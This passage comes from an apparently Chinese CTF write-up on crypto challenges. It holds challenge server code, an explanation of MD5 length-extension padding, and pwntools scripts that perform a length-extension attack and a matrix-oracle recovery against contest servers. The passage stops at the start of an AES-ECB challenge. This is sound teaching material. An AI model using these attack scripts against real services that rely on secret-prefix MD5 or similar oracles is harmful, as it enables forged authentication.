function_">send</span>(<span class="hljs-params">self, msg, newline=<span class="hljs-literal">True</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> newline:<br>                msg += <span class="hljs-string">b&#x27;\n&#x27;</span><br>            <span class="hljs-variable language_">self</span>.request.sendall(msg)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>._recvall()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">my_md5</span>(<span class="hljs-params">self,text</span>):<br>        mymd5=hashlib.md5()<br>        mymd5.update(text)<br>        <span class="hljs-keyword">return</span> mymd5.hexdigest()<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        signal.alarm(<span class="hljs-number">30</span>)<br><br>        c=random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>)<br>        want=random.randbytes(c)<br>        want_md5=<span class="hljs-variable language_">self</span>.my_md5(want)<br>        <span class="hljs-variable language_">self</span>.send(want_md5.encode())<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nPlease input the secret:&quot;</span>)<br>            secret = <span class="hljs-variable language_">self</span>.recv()<br><br>            final=want+secret<br>            final_md5=<span class="hljs-variable language_">self</span>.my_md5(final)<br><br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nPlease input your md5:&quot;</span>)<br>            your_md5=<span class="hljs-variable language_">self</span>.recv().decode()<br>            <span class="hljs-keyword">if</span>  final_md5 == your_md5:<br>                <span class="hljs-variable language_">self</span>.send(flag.encode())<br>                <span class="hljs-keyword">break</span><br>        <br>            <br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nConnection has been closed  =.=  &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.request.close()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    HOST, PORT = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span><br>    server = ForkedServer((HOST, PORT), Task)<br>    server.allow_reuse_address = <span class="hljs-literal">True</span><br>    server.serve_forever()<br><br></code></pre></td></tr></table></figure><p>（前言：循环100次单纯想检验一下写代码解决，而不是直接用别人的脚本生成一个结果就好了，所以可能会有点恶心，请见谅）</p><p>就是放在密码里得md5扩展攻击</p><p>原始内容长度是随机，爆破一下就可以了。</p><p>（以下原理讲的可能不是很清楚，可以看结合第二周web中的视频讲解观看）</p><p>原理：</p><p>首先需要从md5加密过程开始说起，md5加密是分组进行加密的，每组512bits。在一开始，需要对明文进行填充，如果最后分组不满512bits的需要填充到512bits；如果原始内容刚刚好可以分组，那也需要填充一个512bits的分组。md5扩展攻击最重要的就是理解填充规则。</p><p>填充规则：</p><p>首先添加一个固定字节b’\x80’，之后需要填充由原始明文长度计算得来的8个字节，这8个字节是一定需要填充的，所以如果这个时候明文已经到达了57bytes，再填充8字节就会不再是刚好的64bytes(512bits)，所以这时候我们要新添一个分组。最后八字节为原始明文长度，填充方式为小端序。</p><p>比如len=10，先填上个b’\x80’，这时候长度为11，可以填充8字节，那么再填充b’\x00’*(64-8-1-10)，64为一个分组的字节数，8为最后需要填充的数据，1是最开始填充的b’\x80’，最后填充八个字节为b’\x50\x00\x00\x00\x00\x00\x00\x00’。</p><p>比如len=33，先填上个b’\x80’，那么再填充b’\x00’*(64-8-1-33)，最后填充八个字节为b’\x08\x01\x00\x00\x00\x00\x00\x00’。原始数据为264bits，验证：0x108=264</p><p>比如len=56，先填上个b’\x80’，这时候有57字节，再填充8字节的话为65字节，那么不满足分组条件，所以这时候我们需要再填充b’\x00’*(64*2-8-1-56)，也就是63个0字节，最后填充八个字节为b’\xc0\x01\x00\x00\x00\x00\x00\x00。原始数据为448bits，验证：0x01c0=448</p><p>当我们填充完数据后，从第一个分组开始进行md5加密，加密过程可以不用在意，只需知道每次加密后得到32个16六进制，加密后的结果分成四组，当成下一个分组加密的IV，这是攻击的关键。</p><p>一开始，我们知道原始内容的md5值，并且原始内容长度小于64字节。这时候，服务器我们可以在原始内容后面添加自定义数据，那么最重要的就是，根据填充规则，我们只要知道原始内容长度，我们就可以自己进行填充，只要我们自己填充的数据与md5加密时一样，最后计算出的md5值也会一样，那么这个结果是作为下一组内容加密时的IV。</p><p>所以我们像服务器发送数据为：填充内容+任意内容</p><p>最后发送 任意内容的md5结果，当然这里需要根据服务器一开始传来的md5值作为IV来进行加密</p><p>这里我用GPT生成了一份md5加密代码，在加密时传送进去IV值，<strong>最重要的是，我这份源码是原始的md5加密代码，我们需要在”任意内容“前填上64bytes*分组数，而且在加密函数(my_md5)中，我们只要最后一个分组的结果，所以我们需要跳过前面几个分组（在代码中skip变量处体现）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> math<br><br><span class="hljs-comment"># 定义MD5所需的常量</span><br>T = [<span class="hljs-built_in">int</span>(<span class="hljs-number">4294967296</span> * <span class="hljs-built_in">abs</span>(math.sin(i + <span class="hljs-number">1</span>))) &amp; <span class="hljs-number">0xFFFFFFFF</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)]<br><br><br><span class="hljs-comment"># 定义左旋转函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">left_rotate</span>(<span class="hljs-params">x, c</span>):<br>    <span class="hljs-keyword">return</span> (x &lt;&lt; c) | (x &gt;&gt; (<span class="hljs-number">32</span> - c))<br><br><br><span class="hljs-comment"># 定义MD5主循环所需的四个基本函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">F</span>(<span class="hljs-params">x, y, z</span>):<br>    <span class="hljs-keyword">return</span> (x &amp; y) | (~x &amp; z)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">G</span>(<span class="hljs-params">x, y, z</span>):<br>    <span class="hljs-keyword">return</span> (x &amp; z) | (y &amp; ~z)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">H</span>(<span class="hljs-params">x, y, z</span>):<br>    <span class="hljs-keyword">return</span> x ^ y ^ z<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">I</span>(<span class="hljs-params">x, y, z</span>):<br>    <span class="hljs-keyword">return</span> y ^ (x | ~z)<br><br><br><span class="hljs-comment"># 定义MD5算法</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_md5</span>(<span class="hljs-params">message, A, B, C, D, skip</span>):<br>    <span class="hljs-comment"># 初始化变量</span><br>    a, b, c, d = A, B, C, D<br><br>    <span class="hljs-comment"># 填充消息</span><br>    original_length = <span class="hljs-built_in">len</span>(message) * <span class="hljs-number">8</span><br>    message += <span class="hljs-string">b&#x27;\x80&#x27;</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">len</span>(message) * <span class="hljs-number">8</span>) % <span class="hljs-number">512</span> != <span class="hljs-number">448</span>:<br>        message += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>    message += struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, original_length)<br><br>    <span class="hljs-comment"># 处理每个512位（64字节）块</span><br>    <span class="hljs-comment"># 跳过前几个分组</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span> * skip, <span class="hljs-built_in">len</span>(message), <span class="hljs-number">64</span>):<br>        block = message[i:i + <span class="hljs-number">64</span>]<br>        X = struct.unpack(<span class="hljs-string">&#x27;&lt;16I&#x27;</span>, block)<br><br>        <span class="hljs-comment"># 备份当前的a, b, c, d值</span><br>        AA, BB, CC, DD = a, b, c, d<br>        <span class="hljs-comment"># 进行四轮操作，每轮16步</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= i &lt;= <span class="hljs-number">15</span>:<br>                k, s, func = i, [<span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">22</span>][i % <span class="hljs-number">4</span>], F(b, c, d)<br>            <span class="hljs-keyword">elif</span> <span class="hljs-number">16</span> &lt;= i &lt;= <span class="hljs-number">31</span>:<br>                k, s, func = (<span class="hljs-number">5</span> * i + <span class="hljs-number">1</span>) % <span class="hljs-number">16</span>, [<span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">20</span>][i % <span class="hljs-number">4</span>], G(b, c, d)<br>            <span class="hljs-keyword">elif</span> <span class="hljs-number">32</span> &lt;= i &lt;= <span class="hljs-number">47</span>:<br>                k, s, func = (<span class="hljs-number">3</span> * i + <span class="hljs-number">5</span>) % <span class="hljs-number">16</span>, [<span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">16</span>, <span class="hljs-number">23</span>][i % <span class="hljs-number">4</span>], H(b, c, d)<br>            <span class="hljs-keyword">elif</span> <span class="hljs-number">48</span> &lt;= i &lt;= <span class="hljs-number">63</span>:<br>                k, s, func = (<span class="hljs-number">7</span> * i) % <span class="hljs-number">16</span>, [<span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">21</span>][i % <span class="hljs-number">4</span>], I(b, c, d)<br><br>            temp = b + left_rotate((a + func + X[k] + T[i]) &amp; <span class="hljs-number">0xFFFFFFFF</span>, s)<br>            a, b, c, d = d, temp &amp; <span class="hljs-number">0xFFFFFFFF</span>, b, c<br><br>        <span class="hljs-comment"># 将结果加到当前的a, b, c, d</span><br>        a = (a + AA) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        b = (b + BB) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        c = (c + CC) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        d = (d + DD) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-comment"># 返回哈希结果</span><br>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&#x27;&lt;4I&#x27;</span>, a, b, c, d).<span class="hljs-built_in">hex</span>()<br><br><br>rem = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>, <span class="hljs-number">33573</span>)<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    want_md5 = rem.recv(<span class="hljs-number">32</span>).decode()  <span class="hljs-comment"># 接收原始数据的md5</span><br><br>    <span class="hljs-comment"># 计算成iv</span><br>    iv = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        tmp = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            tmp += want_md5[(i + <span class="hljs-number">1</span>) * <span class="hljs-number">8</span> - (j + <span class="hljs-number">1</span>) * <span class="hljs-number">2</span>:(i + <span class="hljs-number">1</span>) * <span class="hljs-number">8</span> - j * <span class="hljs-number">2</span>]<br>        iv.append(<span class="hljs-built_in">int</span>(tmp, <span class="hljs-number">16</span>))<br><br>    <span class="hljs-comment"># 爆破长度</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">64</span>):<br>        rem.recvuntil(<span class="hljs-string">b&quot;Please input the secret:&quot;</span>)<br><br>        <span class="hljs-comment"># 填充消息</span><br>        payload = <span class="hljs-string">b&#x27;&#x27;</span><br>        payload_length = i * <span class="hljs-number">8</span><br>        payload += <span class="hljs-string">b&#x27;\x80&#x27;</span><br>        <span class="hljs-keyword">while</span> ((i + <span class="hljs-built_in">len</span>(payload)) * <span class="hljs-number">8</span>) % <span class="hljs-number">512</span> != <span class="hljs-number">448</span>:<br>            payload += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>        payload += struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, payload_length)<br>        payload += <span class="hljs-string">b&#x27;naby&#x27;</span><br><br>        rem.sendline(payload)<br><br>        <span class="hljs-comment"># 计算填充数据后的有几个分组，需要跳过计算</span><br>        skip = (i + <span class="hljs-built_in">len</span>(payload) - <span class="hljs-number">4</span>) // <span class="hljs-number">64</span><br>        A, B, C, D = iv<br>        message = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">64</span> * skip) + <span class="hljs-string">b&#x27;naby&#x27;</span><br>        res = my_md5(message, A, B, C, D, skip)<br>        rem.recvuntil(<span class="hljs-string">b&quot;Please input your md5:&quot;</span>)<br>        rem.sendline(res.encode())<br>        rem.recvline()<br>        m = rem.recvline()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;correct&#x27;</span> <span class="hljs-keyword">in</span> m:<br>            <span class="hljs-built_in">print</span>(_, want_md5, i, m)<br>            <span class="hljs-keyword">break</span><br><br>rem.interactive()<br></code></pre></td></tr></table></figure><h2 id="fin"><a class="markdownIt-Anchor" href="#fin"></a> Fin</h2><h3 id="猜猜看"><a class="markdownIt-Anchor" href="#猜猜看"></a> 猜猜看</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> ast<br><span class="hljs-keyword">import</span> os<br>flag = os.getenv(<span class="hljs-string">&#x27;GZCTF_FLAG&#x27;</span>).encode()<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>(socketserver.BaseRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_recvall</span>(<span class="hljs-params">self</span>):<br>        BUFF_SIZE = <span class="hljs-number">2048</span><br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            part = <span class="hljs-variable language_">self</span>.request.recv(BUFF_SIZE)<br>            data += part<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(part) &lt; BUFF_SIZE:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> data.strip()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, msg, newline=<span class="hljs-literal">True</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> newline:<br>                msg += <span class="hljs-string">b&#x27;\n&#x27;</span><br>            <span class="hljs-variable language_">self</span>.request.sendall(msg)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>._recvall()<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag)==<span class="hljs-number">45</span><br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;hello.&quot;</span>)<br><br>        m=bytes_to_long(flag)<br>        m=<span class="hljs-built_in">bin</span>(m)[<span class="hljs-number">2</span>:]<br><br>        length=<span class="hljs-built_in">len</span>(m)<br><br>        x=np.array([<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m])<br>        T=np.array([[random.getrandbits(<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length)] <span class="hljs-keyword">for</span> __ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length)])<br><br>        y=np.dot(x,T)<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">list</span>(y)).encode())<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            user_input=ast.literal_eval(<span class="hljs-variable language_">self</span>.recv().strip().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(user_input,<span class="hljs-built_in">list</span>):<br>                <span class="hljs-keyword">try</span>:<br>                    mat=np.array(user_input)<br>                    res=<span class="hljs-built_in">list</span>(np.dot(mat,T))<br>                    <span class="hljs-variable language_">self</span>.send(<span class="hljs-built_in">str</span>(res).encode())<br>                <span class="hljs-keyword">except</span>:<br>                    <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;wrong!!&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;wrong!&#x27;</span>)<br>                <span class="hljs-keyword">break</span><br>        <br><br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nConnection has been closed  =.=  &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.request.close()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    HOST, PORT = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span><br>    server = ForkedServer((HOST, PORT), Task)<br>    server.allow_reuse_address = <span class="hljs-literal">True</span><br>    server.serve_forever()<br></code></pre></td></tr></table></figure><p>灵感来自借nss3rd研究MT19937题目时想出来的点子。</p><p>参考：<a href="https://www.anquanke.com/post/id/205861#h3-9">浅析MT19937伪随机数生成算法-安全客 - 安全资讯平台 (anquanke.com)</a></p><p>有提到一个黑盒测试，通过矩阵乘法的性质，利用左乘一个只有一个1，其他都位0的矩阵，可以得到右矩阵的某一行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote()<br>p.recvline()<br>flag=<span class="hljs-built_in">eval</span>(p.recvline())<br>length=<span class="hljs-number">45</span>*<span class="hljs-number">8</span>-<span class="hljs-number">1</span><br>T=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<br>    x=[<span class="hljs-number">0</span>]*i+[<span class="hljs-number">1</span>]+[<span class="hljs-number">0</span>]*(length-<span class="hljs-number">1</span>-i)<br>    p.sendline(<span class="hljs-built_in">str</span>(x).encode())<br>    T.append(<span class="hljs-built_in">eval</span>(p.recvline()))<br>T=np.array(T)<br>t_ni=np.linalg.inv(T)<br><br>m=np.dot(flag,t_ni)<br>m=np.<span class="hljs-built_in">round</span>(m)<br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m:<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-number">1</span>:<br>        flag+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        flag+=<span class="hljs-string">&#x27;0&#x27;</span><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(flag,<span class="hljs-number">2</span>)))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ecb是不安全的"><a class="markdownIt-Anchor" href="#ecb是不安全的"></a> ECB是不安全的</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br>flag = os.getenv(<span class="hljs-string">&#x27;GZCTF_FLAG&#x27;</span>).encode()<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>(socketserver.BaseRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_recvall</span>(<span class="hljs-params">self</span>):<br>        BUFF_SIZE = <span class="hljs-number">2048</span><br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            part = <span class="hljs-variable language_">self</span>.request.recv(BUFF_SIZE)<br>            data += part<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(part) &lt; BUFF_SIZE:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> data.strip()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, msg, newline=<span class="hljs-literal">True</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> newline:<br>                msg += <span class="hljs-string">b&#x27;\n&#x27;</span><br>            <span class="hljs-variable language_">self</span>.request.sendall(msg)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>._recvall()<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br><br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;the server will connect you entered to the front of flag.&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;then you will receive ciphertext(b64encode) encrypted by AES-ECB.&quot;</span>)<br><br>        key=os.urandom(<span class="hljs-number">16</span>)<br>        my_aes=AES.new(key=key,mode=AES.MODE_ECB)<br>        <span class="hljs-variable language_">self</span>.send(base64.b64encode(my_aes.encrypt(pad(flag,AES.block_size))))<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-variable language_">self</span>.send(<span 